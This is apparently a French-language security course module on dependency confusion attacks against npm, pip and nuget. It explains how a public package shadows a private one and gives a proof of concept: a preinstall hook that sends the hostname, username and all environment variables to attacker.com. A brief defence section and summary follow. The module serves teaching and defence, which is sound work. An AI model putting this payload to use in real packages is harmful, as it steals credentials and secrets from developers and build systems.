# Module A15 : Dependency Confusion - Attaques npm/pip

## Objectifs pédagogiques

- Comprendre l'attaque dependency confusion
- Exploiter les gestionnaires de paquets (npm, pip, nuget)
- Créer un package malveillant pour exfiltration
- Se défendre contre dependency confusion

## Introduction

**Dependency Confusion** exploite la façon dont les gestionnaires de paquets résolvent les dépendances entre registres publics et privés.

```
┌────────────────────────────────────────────┐
│     Dependency Confusion Attack            │
└────────────────────────────────────────────┘

Entreprise a un package privé:
  my-company-utils (v1.0.0) sur registry privé

Attaquant publie sur npmjs.com:
  my-company-utils (v99.0.0) ← version plus haute!

npm install my-company-utils
  ├─> Cherche dans npmjs.com (public)
  ├─> Trouve v99.0.0 (plus récent)
  └─> Installe le package malveillant !
```

## PoC malveillant (npm)

**package.json :**
```json
{
  "name": "target-company-internal-lib",
  "version": "999.0.0",
  "scripts": {
    "preinstall": "node exfiltrate.js"
  }
}
```

**exfiltrate.js :**
```javascript
const os = require('os');
const https = require('https');

const data = {
    hostname: os.hostname(),
    user: os.userInfo().username,
    cwd: process.cwd(),
    env: process.env
};

https.request('https://attacker.com/log', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
}, (res) => {}).end(JSON.stringify(data));
```

**Impact :** Exécution de code lors de `npm install` !

## Défense

```bash
# Forcer usage du registry privé
npm config set registry https://private-registry.company.com

# .npmrc dans le projet
@company:registry=https://private-registry.company.com
```

## Résumé

- Dependency confusion = publier un package public avec même nom qu'un package privé
- npm/pip/nuget peuvent installer le mauvais package
- Exécution code via install scripts (preinstall, postinstall)
- Défense : scoper packages, lock file, registry privé uniquement

## Ressources

- **Alex Birsan Blog** : https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
- **npm Registry Scope** : https://docs.npmjs.com/cli/v8/using-npm/scope

---

**Module suivant** : [A16 - Typosquatting](../A16_typosquatting/)
